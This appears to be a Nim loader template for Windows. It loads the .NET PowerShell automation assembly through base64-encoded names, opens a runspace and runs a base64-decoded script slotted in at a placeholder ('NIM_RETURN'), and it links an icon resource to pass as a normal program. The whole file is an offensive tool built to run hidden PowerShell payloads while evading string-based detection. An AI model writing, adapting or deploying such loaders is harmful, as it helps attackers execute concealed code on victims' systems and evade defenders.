when defined(gcc) and defined(windows):
  when defined(x86):
    {.link: "demo.res".}
  else:  
    {.link: "Resource/demo_icon.o".}
import winim/clr
import base64    
let m = decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbg==")
var Automation = load(m)
let a = decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuUnVuc3BhY2VGYWN0b3J5")
var RunspaceFactory = Automation.GetType(a)
var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()
var pipeline = runspace.CreatePipeline()
let strdecode = decode("NIM_RETURN")
pipeline.Commands.AddScript(strdecode)
pipeline.Invoke()
runspace.Close()